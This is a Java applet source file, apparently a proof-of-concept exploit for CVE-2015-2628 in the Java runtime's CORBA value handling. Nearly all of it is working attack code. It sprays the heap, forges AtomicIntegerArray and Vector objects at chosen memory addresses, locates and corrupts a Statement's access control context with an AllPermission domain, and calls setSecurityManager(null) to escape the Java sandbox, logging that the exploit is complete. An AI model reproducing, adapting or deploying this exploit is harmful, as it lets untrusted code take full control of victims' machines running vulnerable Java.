package poc.cve_2015_2628;

import java.applet.Applet;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.AccessControlContext;
import java.security.AllPermission;
import java.security.CodeSigner;
import java.security.CodeSource;
import java.security.PermissionCollection;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.Vector;
import java.util.concurrent.atomic.AtomicIntegerArray;

import javax.rmi.CORBA.ValueHandler;

import org.omg.CORBA.ORB;
import org.omg.CORBA.portable.InputStream;
import org.omg.CORBA.portable.OutputStream;

public class Main extends Applet {

	
	private static final long serialVersionUID = -6147949064636016140L;
	
	private static final AtomicIntegerArray[] AIA_STACK = new AtomicIntegerArray[ 1024 ];
	private static int AIA_STACK_TOP = 0;
	
	private static void detectOOPType( ORB orb ) {
		Utils.increaseDepth();
		
		final ValueHandler vHandler = Constants.V_HANDLER;
		final String arch = System.getProperty( "os.arch" );
		
		Utils.logln( "Arch type: %s.", arch );
		if( arch.contains( "x86" ) ) {
			OOP.TYPE = OOP.OOP_32;
		}
		else if( arch.contains( "64" ) ){
			OutputStream output = orb.create_output_stream( );
			OOP.OOP_64.putAddress( output, 0xFFFFFFFFFFFFFFFFl );
			
			InputStream input = output.create_input_stream( );
			
			Utils.logln( "Reading in AtomicReferenceChild." );
			Utils.increaseDepth();
			AtomicReferenceChild child = ( AtomicReferenceChild ) vHandler.readValue( input, 0, AtomicReferenceChild.class, Constants.ARC_REF, Proxy.INSTANCE );
			Utils.decreaseDepth();
			
			if( child.bufVar == 0xFFFFFFFF ) {
				OOP.TYPE = OOP.OOP_COMPRESSED;
			}
			else {
				OOP.TYPE = OOP.OOP_64;
			}
			
			// Make sure to clean up any references that point
			//  to invalid objects.
			child.set( null );
		}
		else {
			throw new AssertionError( "Unreconized arch type: " + arch );
		}
		
		Utils.decreaseDepth();
	}
	
	private static AtomicIntegerArray createAIA( long addr ) {
		Utils.increaseDepth();
		Utils.logln( "Creating AtomicIntegerArray with addr: 0x%X.", addr );
		
		final ValueHandler vHandler = Constants.V_HANDLER;
		
		Utils.logln( "Preparing OutputStream." );
		final OutputStream output = ORB.init().create_output_stream();
		OOP.TYPE.putAddress( output, addr );
		
		Utils.logln( "Creating InputStream." );
		final InputStream input = output.create_input_stream();
		
		Utils.logln( "Reading in AtomicIntegerArray." );
		Utils.increaseDepth();
		AtomicIntegerArray aia = ( AtomicIntegerArray ) vHandler.readValue( input, 0, AtomicIntegerArray.class, Constants.AIA_REF, Proxy.INSTANCE );
		Utils.decreaseDepth();
		Utils.logln( "AtomicIntegerArray created." );
		
		Utils.decreaseDepth();
		
		Main.AIA_STACK[ Main.AIA_STACK_TOP++ ] = aia;
		
		return aia;
	}
	
	@SuppressWarnings("unchecked")
	private static Vector< Object > createVector( long addr ) {
		Utils.increaseDepth();
		Utils.logln( "Creating Vector with addr: 0x%X.", addr );
		
		final ValueHandler vHandler = Constants.V_HANDLER;
		
		Utils.logln( "Preparing OutputStream." );
		final OutputStream output = ORB.init().create_output_stream();
		OOP.TYPE.putAddress( output, addr );
		output.write_long( 1 );
		
		Utils.logln( "Creating InputStream." );
		final InputStream input = output.create_input_stream();
		
		Utils.logln( "Reading in Vector." );
		Utils.increaseDepth();
		Vector< Object > vector = ( Vector< Object > ) vHandler.readValue( input, 0, Vector.class, Constants.VECTOR_REF, Proxy.INSTANCE );
		Utils.decreaseDepth();
		Utils.logln( "Vector created." );
		Utils.decreaseDepth();
		
		return vector;
	}

	
	private static AccessControlContext createPrivACC( ) throws Throwable {
		PermissionCollection collection = new Permissions( );
		collection.add( new AllPermission( ) );
		
		CodeSource source = new CodeSource( new URL( "file:////" ), new CodeSigner[ 0 ] );
		
		ProtectionDomain domain = new ProtectionDomain( source, collection );
		
		return new AccessControlContext( new ProtectionDomain[ ] { domain } );
	}
	

	@Override
	public void init( ) {
		try {
			Utils.logln( "Creating ORB instance." );
			
			Utils.logln( "Waiting for ORB." );
			ORB orb = ORB.init( this, null );
			while( orb == null ) {
				Thread.sleep( 1000 );
				try {
					orb = ORB.init();
				} catch( Throwable t ) { }
			}
			Utils.logln( "Got ORB instance: %s.", orb );
			
			
			Utils.logln( "Detecting VM OOP Type." );
			Main.detectOOPType( orb );
			Utils.logln( "Detected VM OOP Type: %s.", OOP.TYPE );
			
			System.gc( );
			final int bufLength = 1024 * 1024 / 4;
			List< int[] > bufs = new LinkedList< int[ ] > ( );
			try {
				int i = 1;
				while( true ) {
					int[] buf = new int[ bufLength ];
					Arrays.fill( buf, i++ );
					
					bufs.add( buf );
				}
			}
			catch( OutOfMemoryError oome ) { }
			
			for( int i = 0; i < 10; i++ ) {
				bufs.remove( bufs.size( ) - 1 );
			}
			System.gc( );
			
			Object[] oo = new Object[ 6 ];
			oo[ 0 ] = new Integer( 0x7FFFFFFF );
			oo[ 1 ] = new Statement( System.class, "setSecurityManager", new Object[ ] { null } );
			oo[ 2 ] = Main.createPrivACC( );
			
			
			Utils.logln( "Searching for buffer address." );
			Utils.increaseDepth();
			
			AtomicIntegerArray aia = null;
			
			final long STEP_SIZE = ( 1024 * 1024 * 64 );
			long addr;
			
			int bufNum = 0;
			int offset = 0;
			for( addr = OOP.TYPE.getHeapStart(); addr < Long.MAX_VALUE; addr += STEP_SIZE ) {
				Utils.logln( "Testing address: 0x%X.", addr );
				aia = Main.createAIA( addr );
				
				bufNum = aia.length() - 1;
				
				if( bufNum >= bufs.size() || bufNum < 0 ) {
					Utils.logln( "[MISS] Invalid buffer index: %d.", bufNum );
					continue;
				}
				
				int[] buf = bufs.get( bufNum );
				offset = 0;
				do {
					buf[ offset ] = 0;
					if( aia.length( ) != ( bufNum + 1 ) ) {
						break;
					}
					offset++;
				} while( offset < bufLength );
				if( offset == bufLength ) {
					Utils.logln( "[MISS] Offset not found in buffer: %d.", bufNum );
					for( int i = 0; i < buf.length; i++ ) {
						buf[ i ] = bufNum + 1;
					}
					continue;
				}
				
				Utils.logln( "[HIT] Found address in buffer: %d[ %d ].", bufNum, offset );
				break;
			}
			
			Utils.decreaseDepth();
			Utils.logln( "Found address: 0x%X, in buf: %d at offset: %d.", addr, bufNum, offset );
			
			final int[] buf = bufs.get( bufNum );
			buf[ offset ] = 2;
			Vector< Object > v = Main.createVector( addr );
			
			
			Utils.logln( "Searching for 'oo' address. This may take a while." );
			long ooAddr    = 0;
			long startAddr = OOP.TYPE.getHeapStart();
			long endAddr   = Long.MAX_VALUE - 8;
			for( long i = startAddr; i < endAddr; i += 8 ) {
				OOP.TYPE.putAddress( aia, 0, i );
				if( oo == v.get( 0 ) ) {
					ooAddr = i;
					break;
				}
			}
			Utils.logln( "Found 'oo' address: 0x%X.", ooAddr );
			
			Utils.logln( "Moving pointer to oo." );
			aia = Main.createAIA( ooAddr );
			
			final long integerAddr   = OOP.TYPE.getAddress( aia, 0 );
			final long statementAddr = OOP.TYPE.getAddress( aia, 1 );
			final long accAddr       = OOP.TYPE.getAddress( aia, 2 );
			Utils.logln( "Got offsets: Integer( 0x%X ), Statement( 0x%X ), Acc( 0x%X ).", integerAddr, statementAddr, accAddr );
			
			Utils.logln( "Moving pointer to integer.");
			aia = Main.createAIA( integerAddr );
			
			final int statementOffset = ( int ) ( ( ( statementAddr - integerAddr - OOP.TYPE.getHeaderDif() ) >>> 2 ) & 0x7FFFFFFF );
			Utils.logln( "Using offset: 0x%X.", statementOffset );
			OOP.TYPE.putAddress( aia, statementOffset, accAddr );
			
			Utils.logln( "Removing SecurityManager." );
			( ( Statement ) oo[ 1 ] ).execute();
			Utils.logln( "SecurityManager: %s.", System.getSecurityManager() );
			
			Utils.logln( "Cleaning up invalid pointers." );
			Field elementData = Vector.class.getDeclaredField( "elementData" );
			elementData.setAccessible( true );
			elementData.set( v, null );
			
			
			Field array = AtomicIntegerArray.class.getDeclaredField( "array" );
			array.setAccessible( true );
			for( int i = 0; i < Main.AIA_STACK_TOP; i++ ) {
				array.set( Main.AIA_STACK[ i ], null );
				Main.AIA_STACK[ i ] = null;
			}
			aia = null;
			
			bufs.clear();
			bufs = null;
			System.gc( );
			
			Utils.logln( "Exploit complete, SecurityManager removed and VM in stable state." );
		}
		catch( Throwable t ) {
			t.printStackTrace();
		}
	}
	
}
